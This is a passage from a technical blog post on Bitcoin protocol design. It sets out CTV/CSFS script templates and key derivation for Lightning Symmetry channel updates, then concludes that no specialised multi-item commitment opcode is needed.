key deterministically derived from the channel key and the locktime, and then
almost use the naive CTV-CSFS scripts:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>internalkey(n):
bip32_derive(musig(keyA, keyB), /&lt;S+n+1&gt;)
script(n):
CTV 2DUP EQUAL NOT VERIFY ROT SWAP IKEY CSFS VERIFY IKEY CSFS VERIFY &lt;S+n+1&gt; CLTV
channel:
tr(musig(keyA, keyB), raw(&lt;script(0)&gt;))
update:
tr(internalkey(n), raw(DEPTH NOTIF &lt;settlement-n-hash&gt; CTV ELSE &lt;script(n)&gt; ENDIF))
update-stack:
&lt;settlement-n-sig&gt; &lt;update-n-sig&gt; &lt;settlement-n-hash&gt; &lt;update-n-hash&gt;
</code></pre></div></div>

<p>Either channel partner can deterministicaly derive the correct internal key
needed to reconstruct the spend stack from any update from the locktime of the
update transaction itself. These derived internal keys are only used to sign
one pair of update and settlement hash, and the script checks that the two
signatures are for different data.</p>

<h2 id="conclusion">Conclusion</h2>

<p>These techniques remove the need for bitcoin upgrade proposals which enable
Lightning Symmetry to include a specific function for committing to multiple
items with a single signature. Of course if a more efficient method for
combining items into a single commitment is available Lightning developers
will be able to take advantage of it and reduce the witness space required for
Lightning Symmetry.</p>

  </div>
<hr>
  
</div>

<div class="pagination">
  
    <span class="pagination-item newer">Newer</span>
  
  
  <a class="pagination-item older" href="/blog/page/2/">Older</a>
  
</div>

</div>

        </div>
        <div class="content container" style="padding-bottom:0;padding-top:0;bottom:0px;">
            <div class="posts" style="height:14pt;margin-bottom:0;">
                <div class="post">
                    <p style="text-align:center;font-size:12pt;">&copy; 2011-2021 Jeremy Rubin. All rights reserved.</p>
                </div>
            </div>
        </div>
    </body>
</html>
